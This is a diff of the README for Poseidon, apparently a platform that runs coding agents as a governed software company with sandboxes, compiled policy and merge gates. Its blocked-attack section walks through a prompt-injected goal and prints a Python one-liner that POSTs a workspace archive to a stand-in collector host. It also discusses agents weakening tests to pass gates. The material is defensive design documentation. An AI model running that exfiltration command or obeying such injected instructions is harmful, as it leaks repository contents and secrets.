@@ -1,27 +1,76 @@
 # Poseidon
 
-**An agent company that cannot exceed its authority — because the
-infrastructure will not let it, not because the prompt asked nicely.**
+**An autonomous software company, run by cloud coding agents, that cannot
+exceed its authority — because the infrastructure will not let it, not
+because the prompt asked nicely.**
 
-Poseidon runs LLM coding agents as a small software organisation: a product
-manager that scopes work and files tickets, ephemeral crews that implement
-and review it, and a human who approves the merge. Every one of those agents
-is governed by policy compiled from a single declarative document, enforced
-at chokepoints the agent cannot route around.
+You give Poseidon a charter — a goal to pursue, a budget to stay under, a
+short list of things that must never happen without you. It stands up a
+small software organisation to pursue that goal: a product manager that
+scopes the work and files tickets, ephemeral crews that implement and review
+each change, and a standing heartbeat that decides what to do next and keeps
+going. Real pull requests appear on your repository. You approve the merges
+that matter and watch the rest happen. When you are ready to grant more, the
+company does more of its own SDLC unattended — up to and including merging
+its own passing work — and never one step past the authority you wrote down.
 
-This README is written to be read start to finish. It teaches the ideas
-first, then shows where each one lives in the code. If you have never worked
-with MCP, OPA, or Kubernetes NetworkPolicy, you should still be able to
-follow it — those sections are here to teach you, not to name-drop. Where a
-design decision instantiates a classical result from the security
-literature, the text says so and [section 12](#12-further-reading) collects
-the primary sources; the aim is that this document can carry a seminar on
-agent governance, not just a deployment.
+The distinction in that first sentence is the whole point. Plenty of tools
+let an agent open a pull request. What is hard, and what Poseidon is about,
+is letting a *company of agents work toward a goal on its own* while
+guaranteeing it cannot force-push to `main`, spend past its budget,
+exfiltrate a secret, or act on an instruction hidden in a GitHub issue — not
+because a careful prompt asked it not to, but because the surrounding system
+makes those outcomes impossible and records every attempt.
+
+### The company is the product
+
+Most agent frameworks are factories: hire an agent for one task, get an
+output, tear it down. Poseidon is trying to be a *company* — a control loop
+with memory that observes the world, decides what is worth doing, does it,
+learns, and repeats, for as long as the goals remain. That ambition sets the
+bar in five places, and each one is a section of this document:
+
+- **Autonomy** — the system chooses the next action from a goal and its
+  state; a human declares the gates and the caps but does not stitch the
+  phases together ([§5](#5-anatomy-of-a-run), [§7](#7-the-blueprint-line-by-line)).
+- **Continuity** — standing agents that remember across restarts. Strategy,
+  taste and unfinished work survive a worker dying; durable execution is why
+  ([§3](#3-concepts-you-need), [§5](#5-anatomy-of-a-run)).
+- **Coordination** — many workstreams, shared artifacts, real priorities: a
+  PM sequencing tickets, crews that implement and review, a heartbeat that
+  picks what runs next ([§5](#5-anatomy-of-a-run)).
+- **Quality** — permission is the easy third of governance. The hard two are
+  whether the work was worth doing and whether it is actually good — so the
+  platform, never the agent, is the gate of record for "the tests pass," and
+  the tests themselves can be split off where the implementer cannot rewrite
+  them ([§5](#5-anatomy-of-a-run), [§8](#8-what-it-can-do)).
+- **Authority** — every consequence is decided by policy a human can read,
+  diff and revoke. Injection is assumed; containment is positional; spend is
+  a stop, not a warning ([§2](#2-the-core-idea)).
+
+This is a working prototype, and it is honest about the distance still to
+travel. The destination is a company that lives in the cloud and actuates on
+the real world — customers, mail, money — not just a repository. Today it
+reaches code, under governance, on a local cluster. [§9](#9-what-it-cannot-do)
+is deliberately specific about the gap.
+
+### How to read this document
+
+It is written to be read start to finish. It teaches the ideas first, then
+shows where each one lives in the code. If you have never worked with MCP,
+OPA, or Kubernetes NetworkPolicy, you should still be able to follow it —
+[§3](#3-concepts-you-need) is there to teach you, not to name-drop. If you
+would rather *use* it than understand it first, jump to
+[Getting started](#6-getting-started); if you want to see a company run
+end to end, [Anatomy of a run](#5-anatomy-of-a-run) is the narrated version
+and the full-run walkthrough in [§6](#6-getting-started) is the hands-on one.
 
 > [!NOTE]
-> **Status: working prototype.** Every claim below is exercised by 91
-> end-to-end tests against a real Kubernetes cluster. It has run only on
-> kind (local Kubernetes), never in production, and the
+> **Status: working prototype.** Every capability below is exercised by 149
+> end-to-end tests against a real Kubernetes cluster, and the suite proves
+> its own claims twice over — two consecutive green runs from a clean repo,
+> ending with the cluster asserted quiet. It has run only on kind (local
+> Kubernetes), never in production, and the
 > [limitations](#9-what-it-cannot-do) section is deliberately specific about
 > what that means.
 
@@ -46,11 +95,15 @@ agent governance, not just a deployment.
 
 ## 1. The problem
 
+The vision only works if the autonomy is safe, so start with the thing that
+makes agent autonomy dangerous.
+
 Give a capable coding agent a repository and a shell, and it will do useful
 work. It will also, eventually, do something you did not intend: force-push
 to `main`, install a package from an attacker's index, paste a secret into a
 log, or follow an instruction it found in a GitHub issue rather than the one
-you gave it.
+you gave it. The more autonomy you grant — and a *company* that runs its own
+backlog is a lot of autonomy — the more that matters.
 
 The usual response is to write a better prompt. *"You are a careful engineer.
 Never push to main. Never exfiltrate secrets."*
@@ -549,29 +602,60 @@ from the `run_id` alone.
 
 ## 5. Anatomy of a run
 
-This is the part worth reading slowly. Here is what actually happens when
-someone asks the company to build something — and, at each step, what stops
-the agent from doing something else.
+This is the part worth reading slowly. It follows one piece of work
+through the whole pipeline — from a goal arriving to the change merging —
+and names, at each step, the mechanism that stops the agent from doing
+anything else.
 
-**Intake.** A goal arrives (`poseidon run --workflow intake goal.md`). The
-orchestrator creates a run row, checks the budget has headroom, and
-dispatches the **PM**. The PM reads the goal, files a ticket through
-`issues.create`, and records a crew request through `crew.request`.
+Three workflows carry the work, and each hands the next an *artifact*, not
+control: intake produces tickets, implement produces a pull request, review
+produces a merge decision. Every run ends in the same teardown.
 
-> The goal text is untrusted input handed straight to an LLM. If it contains
-> an injection telling the PM to spawn a `data-export` crew, the PM will
-> try — and the compiled rule narrows `crew.request` to the conductor's
-> declared `may_spawn` list, so the attempt is denied and audited before
-> anything is created. `tests/e2e_kind/test_injected_conductor.py` runs
-> exactly that attack.
+```mermaid
+flowchart LR
+    subgraph intake ["intake run"]
+        IN["PM scopes the goal,<br/>files tickets"]
+    end
+    subgraph implement ["implement run"]
+        FU["fulfil crew<br/>+ sandbox"] --> PL["plan"] --> IM["implement"] --> VG["verify<br/>gate"] --> DE["deliver<br/>PR"]
+    end
+    subgraph review ["review run"]
+        RV["independent<br/>review"] --> MG["merge<br/>gate"]
+    end
+    intake -->|ticket| implement -->|pull request| review
+```
 
-**Fulfilment.** The implement workflow consumes the recorded request —
-fulfilment never improvises authority; without a recorded, unexpired request
-it refuses. It binds identities for the crew (deterministically from
-`{crew, member, run}`, so a retry after a crash lands on the same row rather
-than leaking a second identity), provisions each member its own pod with its
-own per-run ServiceAccount, and provisions **one sandbox** for the run.
+### Intake: a goal becomes tickets
 
+A goal arrives as untrusted text (`poseidon run --workflow intake goal.md`).
+The orchestrator creates a run row, checks the budget has headroom, and
+dispatches the standing **PM**. The PM reads the goal, files a ticket
+through `issues.create`, and records a crew request through `crew.request`.
+
+> [!NOTE]
+> The goal text is handed straight to an LLM, injection and all. If it
+> tells the PM to spawn a `data-export` crew, the PM will try — and the
+> compiled rule narrows `crew.request` to the conductor's declared
+> `may_spawn` list, so the attempt is denied and audited before anything is
+> created. `tests/e2e_kind/test_injected_conductor.py` runs exactly that
+> attack.
+
+### Fulfilment: a crew and a sandbox
+
+A human starts an implement run from a ticket (or the heartbeat does — see
+[below](#who-starts-the-next-run-the-heartbeat)). Fulfilment then:
+
+1. **Records and consumes a crew request** under the conductor's authority.
+   The recording must win the same compiled `crew.request` decision an
+   intake-time request does; without a recorded, unexpired request,
+   fulfilment refuses. Authority is never improvised.
+2. **Provisions one sandbox** for the run.
+3. **Binds an identity and provisions a pod for each crew member.**
+   Identity is derived deterministically from `{crew, member, run}`, so a
+   retry after a crash lands on the same registry row rather than leaking a
+   second identity. Each pod gets its own per-run ServiceAccount.
+
+> [!NOTE]
 > How does the code get in? Via `repo.archive`, the platform-only sixteenth
 > tool: the *gateway* clones the target repository with its own token,
 > strips the remote — and with it the credentialed URL — and returns the
@@ -579,131 +663,189 @@ own per-run ServiceAccount, and provisions **one sandbox** for the run.
 > configured and no credential anywhere in it. There is nothing to steal
 > and nowhere to push.
 
-**Planning.** The planner is dispatched first, on its own pod — the
-cheapest pod there is, since the planner is LLM-only and needs no sandbox
-wiring. It calls the gateway under its own projected token, so its
-read-only compiled scope is what policy enforces. It produces a task brief.
+### Planning: a read-only brief
 
-**Implementation.** The executor is dispatched with that brief. It reads,
-writes and runs commands in the sandbox — all through the gateway, all
-policy-checked, all audited. Then it says it is done.
+The planner is dispatched first, on its own pod, with no sandbox of its own
+(`needs_sandbox: false`). It surveys the run's shared sandbox through the
+gateway, under its own projected token, so its read-only compiled scope is
+what policy enforces. Its output is a task brief for the executor.
 
-> Its claim is **advisory**. Nothing depends on it.
+### Implementation: work under audit
 
-**The verify gate.** The orchestrator runs the sandbox's test suite *itself*,
-under its own platform identity. This is the gate of record. If it is red,
-the failure is fed back and the executor gets a bounded number of
-re-dispatches (`max_verify_retries`).
+The executor is dispatched with that brief. It reads, writes and runs
+commands in the sandbox — all through the gateway, all policy-checked, all
+audited. Then it says it is done.
 
-**Delivery.** Only after a green verify does the workflow issue a *separate*
-`mode="deliver"` dispatch that has `open_pr` in its tool surface at all.
+> [!IMPORTANT]
+> The executor's claim of success is **advisory**. Nothing that ships
+> depends on it.
 
+### The verify gate
+
+The orchestrator runs the sandbox's test suite *itself*, under its own
+platform identity. This is the gate of record. If it is red, the failure is
+fed back and the executor is re-dispatched, a bounded number of times
+(`max_verify_retries`).
+
+### Delivery: a bundle, not a push
+
+Only after a green verify does the workflow issue a *separate*
+`mode="deliver"` dispatch — the only dispatch whose tool surface contains
+`open_pr` at all.
+
+> [!IMPORTANT]
 > This is the structural point of the whole design. During implementation
-> the delivery tool **does not exist** in the agent's conversation. An agent
-> that decides it is finished cannot deliver, because there is nothing to
-> call. Two independent mechanisms have to fail for unverified code to ship.
+> the delivery tool **does not exist** in the agent's conversation. An
+> agent that decides it is finished cannot deliver, because there is
+> nothing to call. Two independent mechanisms have to fail for unverified
+> code to ship.
 
-Delivery itself is worth slowing down for, because the agent never touches
-the remote. The executor produces a *git bundle* — an offline, verifiable
-container of commits — via `sandbox.git_bundle`. The gateway verifies that
-bundle, applies it to a fresh platform-side clone, extracts the changed
-paths and feeds them to policy as real arguments (this is what makes the
-`deny_paths` rule in section 7 enforceable rather than advisory), and only
-then pushes the branch with its own token and opens the pull request. The
-agent supplied *content*; every action with authority behind it happened
-inside the trusted gateway.
+The agent never touches the remote, either. Delivery works like this:
 
-**Review.** A review run provisions a fresh sandbox from the PR's head ref
-and dispatches an ephemeral reviewer — read-and-judge only, no write tools —
-which runs the tests, posts findings, and ends with a structured pass/fail
-verdict the platform journals.
+1. The executor produces a **git bundle** — an offline, verifiable
+   container of commits — via `sandbox.git_bundle`.
+2. The gateway verifies the bundle and applies it to a fresh platform-side
+   clone.
+3. The gateway extracts the changed paths and feeds them to policy as real
+   arguments — this is what makes the `deny_paths` rule in
+   [section 7](#7-the-blueprint-line-by-line) enforceable rather than
+   advisory.
+4. Only then does the gateway push the branch with its own token and open
+   the pull request.
 
-**The split oracle.** There is a subtlety the merge gate has to answer, and
-it is not about the code — it is about the *rubric*. If green tests are what
-lets policy merge unattended, then the workstream that writes the code must
-not also own the tests that certify it, or it grades its own homework one
-level up. A blueprint that declares `policies.contract_tests` splits the
-tree: a contract/acceptance tree (e.g. `tests/contract/`) that only a
-`contract-author` role may `git.open_pr` into — the implementer's attempt
-dies at the gateway with `git_open_pr_contract_tree` named in the audit row,
-the same positional refusal a `pm` PRing `tests/` gets — versus everything
-else under `tests/`, which is ordinary unit-test code the implementer still
-owns end to end. The PM sequences the phases (write the contract, then
-implement against it) by filing an ordered pair of tickets to two different
-crews; humans declare the paths and the owning role in the document, and the
-compiler enforces both. And because the contract tree joins the merge
-carve-out, an oracle edit can never ride the delegation it certifies — a
-contract PR always parks on a human, exactly like a `.github/` change.
+The agent supplied *content*; every action with authority behind it
+happened inside the trusted gateway.
 
-**The merge gate.** The blueprint names the gate's resolver, and this is
-where quality becomes something policy owns rather than a human eyeballs.
-Under `resolved_by: human` the workflow parks on the `merge` signal: a
-person approves or rejects, and nobody home fires an escalation at half the
-deadline and expires the gate at the end. Under `resolved_by: policy` the
-platform adds its own layers before anything merges — a re-run of the tests
-in the review sandbox (the *same* verify code the implement gate uses, not
-the reviewer's word for it), a registry-checked confirmation that the
-reviewer's identity is not the implementer's, and a compiled `merge.resolve`
-decision that also checks the change stays inside the delegated path class.
-When the company declares a contract tree there is a second, decisive
-platform fact: `contract_green`. The platform composes the PR head's code
-with the contract tree *as it stands on the base ref* — the reviewed head
-supplies the code, but the oracle comes from `main` — and runs exactly those
-tests, scoped, under its own identity. Nothing in that baseline came from
-the PR, so a head suite weakened to green, a skip marker, or a `conftest`
-that neuters collection launders nothing: the code either satisfies the spec
-the human already approved, or it does not merge. (One verification concept,
-parameterized by which tree it runs; the head-suite run stays as hygiene.)
-Only when the independent verdict passed, the platform's own checks are
-green, *the contract baseline is green*, and the paths are in class does the
-merge fire — with no human command. Anything else is a *decline*, not a
-merge: a carve-out surface, an out-of-class path, or the contract tree
-itself falls back to the same human `merge` signal, so the person's override
-survives delegation; a failed verdict, a red re-run, or a red contract feeds
-a bounded rework loop instead (section 8). A diff that touches the contract
-tree declines up front, before any layer is spent — an oracle edit is the
-human's to merge by construction, and the platform posts model-free
-deletion facts (test functions and assertions removed, counted off the
-diff) on the PR so a gutted spec cannot be approved silently. Either way the
-*orchestrator* performs the merge, under its platform identity, via a
-gateway tool call that policy permits to nobody else — and every transition,
-human or policy, is a first-class audit event.
+### Review: independent eyes
 
-**Teardown.** On every terminal path — success, failure, cancellation,
-timeout, worker death — participants are revoked, pods destroyed, the
-sandbox torn down, the registration retired, and the run record written.
+A review run provisions a fresh sandbox from the PR's head ref and
+dispatches an ephemeral reviewer. The reviewer can read the code and run
+it, but holds no tool that writes to the repository. It runs the tests,
+posts findings on the PR, and ends with a structured pass/fail verdict
+that the platform journals.
 
-**Who starts the next run.** Everything above describes one run, and by
-default a human starts each one. A company whose blueprint declares a
-`conduct` section (section 7) also runs a standing **heartbeat**: one
-durable workflow that wakes on the declared cadence, reads the backlog,
-the delivered-but-unreviewed PRs and the day's spend, dispatches the PM in
-a toolless *decide* mode for one action — implement a ticket, review a PR,
-or idle — and starts it under the compiled `conduct.start` decision and
-the declared caps. The PM proposes; the platform disposes; the human
-declares the cadence and the caps and answers the merge gate. Nothing
-about a run changes — the same fulfilment, verify, delivery, review and
-gate above — only who pressed start. `tests/e2e_kind/test_zz_overnight.py`
-runs the whole arc with exactly two human acts: one goal in, one approval
-out. When the blueprint also delegates the merge gate (above), the
-approval drops too: `tests/e2e_kind/test_zz_delegated.py` runs the same arc
-with a single human act — one goal in — and the company merges its own
-in-class passing work with no further command.
+### The split oracle: who owns the tests
+
+The merge gate has to answer a subtlety that is not about the code but
+about the *rubric*: if green tests are what lets policy merge unattended,
+the workstream that writes the code must not also own the tests that
+certify it — or it grades its own homework one level up.
+
+A blueprint that declares `policies.contract_tests` splits the test tree:
+
+- **The contract tree** (e.g. `tests/contract/`) is the oracle. Only a
+  `contract-author` role may `git.open_pr` into it; the implementer's
+  attempt dies at the gateway with `git_open_pr_contract_tree` named in the
+  audit row — as positional as the default deny a `pm` calling
+  `git.open_pr` at all earns.
+- **Everything else under `tests/`** is ordinary unit-test code the
+  implementer still owns end to end.
+
+The PM sequences the phases — write the contract, then implement against
+it — by filing an ordered pair of tickets to two different crews. Humans
+declare the paths and the owning role in the document; the compiler
+enforces both. And because the contract tree can never be delegated, an
+oracle edit can never ride the delegation it certifies: a contract PR
+always parks on a human, the same landing a `.github/` change gets.
+
+### The merge gate: human or policy
+
+The blueprint names the gate's resolver, and this is where quality becomes
+something policy owns rather than a human eyeballs.
+
+**`resolved_by: human`** parks the workflow on the `merge` signal: a person
+approves or rejects. Nobody home is a recorded outcome, not a hang — an
+escalation fires at half the deadline, and the gate expires at the end.
+
+**`resolved_by: policy`** merges with no human command — but only when
+every one of these platform-established facts holds:
+
+- The reviewer's independent verdict passed.
+- The platform's own re-run of the tests in the review sandbox is green —
+  the *same* verify code the implement gate uses, not the reviewer's word
+  for it.
+- The registry confirms the reviewer's identity is not the implementer's.
+- The compiled `merge.resolve` decision allows — which includes checking
+  that every changed path stays inside the delegated path class.
+- When the company declares a contract tree: `contract_green` (below).
+
+Anything short of that is a *decline* or a *rework*, never a quiet merge:
+
+| The change | What happens |
+|---|---|
+| All facts green, paths in class | The merge fires — no human command. |
+| Touches a carve-out surface (`.github/`) or an out-of-class path | Declines to the human `merge` signal; the person's override survives delegation. |
+| Touches the contract tree | Declines up front, before any layer is spent — an oracle edit is the human's to merge by construction. |
+| Failed verdict, red re-run, or red contract | Feeds a bounded rework loop instead ([section 8](#8-what-it-can-do)). |
+
+**`contract_green`, the decisive fact.** The platform composes the PR
+head's code with the contract tree *as it stands on the base ref* — the
+reviewed head supplies the code, but the oracle comes from `main` — and
+runs exactly those tests, scoped, under its own identity. Nothing in that
+baseline came from the PR, so a head suite weakened to green, a skip
+marker, or a `conftest` that neuters collection launders nothing: the code
+either satisfies the spec the human already approved, or it does not
+merge. (One verification concept, parameterized by which tree it runs; the
+head-suite run stays as hygiene.) On any PR that edits the contract tree,
+the platform also posts model-free deletion facts — test functions and
+assertions removed, counted off the diff — so a gutted spec cannot be
+approved silently.
+
+Either way, the *orchestrator* performs the merge, under its platform
+identity, via a gateway tool call that policy permits to nobody else — and
+every transition, human or policy, is a first-class audit event.
+
+### Teardown
+
+Every terminal path — success, failure, cancellation, timeout, worker
+death — runs the same teardown: participants revoked, pods destroyed, the
+sandbox torn down, the registration retired, the run record written.
+
+### Who starts the next run: the heartbeat
+
+Everything above describes one run, and by default a human starts each
+one. A company whose blueprint declares a `conduct` section
+([section 7](#7-the-blueprint-line-by-line)) also runs a standing
+**heartbeat**: one durable workflow that wakes on the declared cadence
+and, each tick:
+
+1. **Observes** the open backlog, the delivered-but-unreviewed PRs, and
+   the day's spend.
+2. **Dispatches the PM in a toolless *decide* mode** for exactly one
+   action: implement a ticket, review a PR, or idle.
+3. **Starts the chosen run** only under the compiled `conduct.start`
+   decision and the declared caps.
+
+The PM proposes; the platform disposes; the human declares the cadence and
+the caps and answers the merge gate. Nothing about a run changes — the
+same fulfilment, verify, delivery, review and gate above — only who
+pressed start.
+
+`tests/e2e_kind/test_zz_overnight.py` runs the whole arc with exactly two
+human acts: one goal in, one approval out. When the blueprint also
+delegates the merge gate, the approval drops too:
+`tests/e2e_kind/test_zz_delegated.py` runs the same arc with a single
+human act — one goal in — and the company merges its own in-class passing
+work with no further command.
 
 <details>
 <summary><b>What a blocked attack looks like from the inside</b></summary>
 
 <br>
 
-Take the injected task in `examples/task-injected.md`: the payload tells the
-executor to publish the workspace to an outside collector. The mock brain
-obeys it credulously — deliberately, because the test is about the platform,
-not the model.
+Take the poisoned goal in `examples/goal-injected-conductor.md`: alongside
+telling the PM to spawn the forbidden `data-export` crew (denied at intake,
+above), its payload instructs the delivery crew to publish a snapshot of
+the repository to `https://collector.control9931.example` before touching
+any code. The mock brain obeys credulously — deliberately, because the test
+is about the platform, not the model.
 
 ```python
-# what the agent runs, via sandbox.exec
-python -c "import urllib.request, tarfile, io; ...
-           urllib.request.urlopen('https://collector.example.net/upload', data)"
+# what the agent runs, via sandbox.exec — a tar.gz of the workspace, POSTed out
+python -c "import io, tarfile, urllib.request; ...
+           urllib.request.urlopen(Request(
+               'https://collector.control9931.example/snapshot',
+               data=buf.getvalue(), method='POST'))"
 ```
 
 1. `sandbox.exec` **is** in the executor's compiled scope, so the gateway
@@ -711,15 +853,18 @@ python -c "import urllib.request, tarfile, io; ...
 2. The sandbox has no DNS and no direct route out. The request goes to the
    egress proxy because the proxy env is the only thing configured.
 3. The proxy resolves the run to its company's allowlist —
-   `pypi.org`, `files.pythonhosted.org` — and `collector.example.net` is not
-   on it. **403**, and an audit event with `source=sandbox-infra`,
+   `pypi.org`, `files.pythonhosted.org` — and `collector.control9931.example`
+   is not on it. **403**, and an audit event with `source=sandbox-infra`,
    `rule=egress_not_allowlisted`, correlated by `run_id`.
 4. Had the payload tried to bypass the proxy with a raw socket,
    NetworkPolicy would have dropped it silently. That layer is the backstop,
    not the alarm.
 
-The agent is told the request failed. It carries on with the real task. The
-attempt is on the record, attributable to one run and one participant.
+The agent is told the request failed. It carries on with the real task —
+the run still delivers its honest work on a feature branch. The attempt is
+on the record, correlated by `run_id` to the very `sandbox.exec` call the
+gateway allowed; `tests/e2e_kind/test_injected_conductor.py` asserts that
+whole arc, one query at a time.
 
 Note carefully what did *not* stop the attack: the model's judgement, the
 prompt, and the tool allow-list. The egress layer did. That is the design
@@ -730,6 +875,17 @@ working as intended — the containment is positional, not behavioural.
 ---
 
 ## 6. Getting started
+
+By the end of this section you will have a company running on a local
+cluster, watched it turn a goal into a merged pull request on a repository
+you own, and — if you grant it the authority — seen it start its own work
+on a heartbeat and merge its own passing changes. It costs nothing: the
+default brain is a deterministic mock, so you can learn the whole shape of
+the system before spending a cent on a real model.
+
+The path: install → bring up a cluster → configure the company →
+(optionally) point it at a real model → drive a run yourself → hand over
+the keys, one at a time. Each step is below.
 
 ### Prerequisites
 
@@ -762,7 +918,7 @@ uv run pytest packages/common
 for p in packages/*/; do uv run pytest "$p" -q; done
 ```
 
-`packages/registry` reports **28 skipped** without `REGISTRY_DSN`. That is
+`packages/registry` reports **38 skipped** without `REGISTRY_DSN`. That is
 green: those tests exercise real SQL, so they need a real Postgres, and a
 fake would prove nothing.
 
@@ -786,6 +942,42 @@ applies the CRDs, and applies the example blueprint.
 > brain by default, so the full end-to-end suite spends zero LLM tokens.
 > A real provider is opt-in — see [Use a real LLM](#use-a-real-llm) — and
 > CI never turns it on.
+
+### Configure the company
+
+A company's entire configuration is its blueprint — one YAML document
+declaring the roster, crews, tools, workflows, gates, budgets and policies.
+There is no second configuration surface: anything the platform enforces,
+you change by editing the document and re-applying it.
+[Section 7](#7-the-blueprint-line-by-line) reads the shipped document line
+by line; this section is about operating it.
+
+The bootstrap applies [`examples/hello-saas.yaml`](examples/hello-saas.yaml)
+for you. The repo ships the same company in three profiles, each granting
+one more piece of authority than the last:
+
+| Blueprint | Adds | Division of labour |
+|---|---|---|
+| [`hello-saas.yaml`](examples/hello-saas.yaml) | — | A human starts every run and answers every merge. |
+| [`hello-saas-conducted.yaml`](examples/hello-saas-conducted.yaml) | a `conduct` section | The company starts its own runs on a heartbeat; a human feeds goals in and answers merges. |
+| [`hello-saas-delegated.yaml`](examples/hello-saas-delegated.yaml) | a policy-resolved merge gate and a contract tree | In-class passing work merges itself; a human feeds goals in and keeps the carve-outs and the oracle. |
+
+All three declare the same company name, so moving between them changes the
+running company in place — and moving back is the same command with the
+earlier file. Revocation is a diff:
+
+```bash
+uv run poseidon blueprint preview examples/hello-saas-conducted.yaml  # what would change
+uv run poseidon blueprint apply examples/hello-saas-conducted.yaml --yes
+```
+
+`preview` diffs the compiled plan against the live registry, so hiring,
+firing and every authority change are visible before they happen. To make
+the company yours, edit the document — the mission, the sandbox image and
+test command, the `egress_allow` list, the budgets, the gate resolvers —
+and re-apply. Mistakes fail at compile time with a readable error: a
+standing executor, an undeclared tool, or a delegated path overlapping a
+protected surface is refused before anything reaches the cluster.
 
 ### Use a real LLM
 
@@ -852,9 +1044,11 @@ Leave a Temporal port-forward up for every CLI command. Do not pass
 kubectl -n poseidon-platform port-forward svc/temporal-frontend 7233:7233
 ```
 
-**Intake.** A goal is untrusted text handed to the PM. The PM files
-tickets and records a `feature-delivery` crew request; it cannot write
-code. [`examples/goal-tetris.md`](examples/goal-tetris.md) is that goal:
+#### 1. Intake
+
+A goal is untrusted text handed to the PM. The PM files tickets and
+records a `feature-delivery` crew request; it cannot write code.
+[`examples/goal-tetris.md`](examples/goal-tetris.md) is that goal:
 
 ```bash
 uv run poseidon run --workflow intake examples/goal-tetris.md
@@ -863,18 +1057,20 @@ uv run poseidon run --workflow intake examples/goal-tetris.md
 The CLI prints `started intake-<run_id> (run_id …)` on stderr and blocks
 until the run finishes. Success is JSON with `"status": "done"`,
 `"workflow": "intake"`, one or more `ticket_urls`, and a
-`crew_request_id`. The issues are real on `TARGET_REPO`. hello-saas
-configures `gates.intake: none`, so there is no signal to send.
+`crew_request_id`. The issues are real on `TARGET_REPO`. hello-saas declares
+no intake gate, so there is no signal to send.
 
 Intake and implement are **separate runs**. Fulfilment keys crew requests
 by `run_id`, so implement does not consume the intake row; a human picks
 which ticket to run — choosing is scheduling — and implement consumes the
 ticket itself.
 
-**Implement.** The ticket intake filed *is* the spec — start implement
-from its issue number and the workflow resolves the open issue under the
-platform identity, composes the task from it, and runs the delivery
-pipeline. The issue body is untrusted input, exactly like any task file:
+#### 2. Implement
+
+The ticket intake filed *is* the spec — start implement from its issue
+number and the workflow resolves the open issue under the platform
+identity, composes the task from it, and runs the delivery pipeline. The
+issue body is untrusted input, exactly like any task file:
 
 ```bash
 uv run poseidon run 42
@@ -899,10 +1095,12 @@ If the per-run budget (`budgets.per_run.usd: 5` in the blueprint) trips,
 the run parks in `paused-budget_exhausted`. Raise the cap, re-apply, then
 `uv run poseidon signal <run_id> budget --approved --workflow implement`.
 
-**Review.** Implement stops at an open PR. Review provisions a fresh
-sandbox from the PR head, dispatches a read-and-judge reviewer, and parks
-on the merge gate — so `--detach` is the usual mode. The number is the
-trailing integer of `pr_url`:
+#### 3. Review and merge
+
+Implement stops at an open PR. Review provisions a fresh sandbox from the
+PR head, dispatches a reviewer that holds no repository-writing tools, and
+parks on the merge gate — so `--detach` is the usual mode. The number is
+the trailing integer of `pr_url`:
 
 ```bash
 uv run poseidon review <pr-number> --detach
@@ -923,6 +1121,91 @@ uv run poseidon signal <review_run_id> merge --workflow review
 Watch a live run with `kubectl -n poseidon-platform logs -f deploy/orchestrator-worker`
 and `kubectl -n hello-saas get pods -w`. Teardown is guaranteed: on every
 terminal path the crew identities, pods, and sandbox go away.
+
+### Hand over the keys: the heartbeat
+
+Everything so far had you pressing start. To let the company run its own
+backlog, apply the conducted profile:
+
+```bash
+uv run poseidon blueprint apply examples/hello-saas-conducted.yaml --yes
+```
+
+No command starts the heartbeat — that is the point. The orchestrator
+worker notices that the applied blueprint now declares a `conduct` section
+and starts one durable workflow, `conduct-hello-saas`, on its own. Every
+`heartbeat_minutes` (30 in the example — the cadence is yours to declare)
+a tick:
+
+1. **Observes** the open backlog, the delivered-but-unreviewed PRs, the
+   in-flight runs and today's spend.
+2. **Dispatches the PM in a toolless *decide* mode** for exactly one
+   action — implement a ticket, review a PR, or idle — with a required
+   one-line rationale, journaled as a `conduct.decide` audit event.
+3. **Starts the chosen run** only if it wins the compiled `conduct.start`
+   decision: within `max_concurrent_runs`, under the `daily_cap`, and only
+   a workflow on the `may_start` list. `intake` is deliberately not on
+   that list — goals always enter through a human.
+
+Your job shrinks to two acts: feed goals in
+(`poseidon run --workflow intake …`) and answer merge gates. Watch it work:
+
+```bash
+uv run poseidon status hello-saas --workflow conduct   # the standing workflow
+kubectl -n poseidon-platform logs -f deploy/orchestrator-worker
+```
+
+To take the keys back, apply a blueprint without the section —
+`hello-saas.yaml` — and the heartbeat stops itself: each tick re-reads the
+applied blueprint and exits when the section is gone, and the compiled
+`conduct.start` rules vanish with it. `tests/e2e_kind/test_zz_overnight.py`
+runs this arrangement end to end with exactly two human acts: one goal in,
+one approval out.
+
+### Hand over the merge: the delegated gate
+
+The one human act each run still needs is the merge approval. The flagship
+profile delegates it — narrowly:
+
+```bash
+uv run poseidon blueprint apply examples/hello-saas-delegated.yaml --yes
+```
+
+Three things change relative to the conducted profile:
+
+- `gates.merge.resolved_by` becomes `policy`, with a `delegate` block
+  naming the path class the company may merge on its own
+  (`slugify.py`, `tests/unit/`) and a rework bound (`max_reworks: 1`).
+- A `policies.contract_tests` block declares the oracle: `tests/contract/`
+  holds the acceptance spec delegated merges are graded by, and it can
+  never be delegated.
+- A new `contract-authoring` crew — the only role that may deliver into
+  the contract tree — joins the PM's `may_spawn` list, so contract-first
+  work can be sequenced.
+
+Now a review run of an in-class PR no longer parks. When the independent
+verdict passed, the platform's own re-run of the tests and the contract
+baseline are green, and every changed path is in class, the orchestrator
+merges with no human command —
+[section 5](#the-merge-gate-human-or-policy) lists the facts and the
+fallbacks. Everything else still stops for you: an out-of-class path, a
+carve-out surface, and any edit to the contract tree park on the same
+`merge` signal you answered above, and a failed quality layer feeds the
+bounded rework loop instead.
+
+> [!NOTE]
+> The delegated class is yours to declare, and the example's is scoped to
+> the acceptance suite's product (`slugify.py`). A Tetris PR from the
+> walkthrough above touches `tetris.py` — out of class, so it declines to
+> your `merge` signal. Edit `delegate.paths` to name the paths you are
+> willing to see merge on green.
+
+With both keys handed over, the human surface is a single act:
+`tests/e2e_kind/test_zz_delegated.py` proves the arc — one goal in, and
+the company scopes, implements, reviews and merges its own in-class
+passing work, every decision on the audit record. Taking the merge back is
+the same diff in reverse: re-apply the conducted profile and every merge
+parks on you again.
 
 ### Run the acceptance suite
 
@@ -1049,8 +1332,6 @@ workflows:
   intake:
     enabled: true
     conductor: pm
-    gates:
-      intake: none
   implement:
     enabled: true
     conductor: pm
@@ -1069,8 +1350,10 @@ workflows:
 ```
 
 Three workflows, one per phase of the SDLC in section 5. `intake` is the
-PM-only scoping pass — no crew and no gate: a gate is an object naming its
-resolver, and a gate nobody declares is a stop nobody takes.
+PM-only scoping pass — no crew, and it declares no `gates` block at all: a
+gate is an object naming its resolver, and a gate nobody declares is a stop
+nobody takes, so goals a human submits dispatch the PM without a second
+stop.
 `max_verify_retries` bounds how many times a red verify
 re-dispatches the executor before the run fails. `drain` answers a question
 most orchestration designs leave implicit: what happens to a running crew
@@ -1230,25 +1513,36 @@ since the API server then refuses TokenReview for its tokens.
 
 ## 8. What it can do
 
-Everything here is asserted by the end-to-end acceptance suite.
+This is the product, stated as capabilities rather than architecture — and
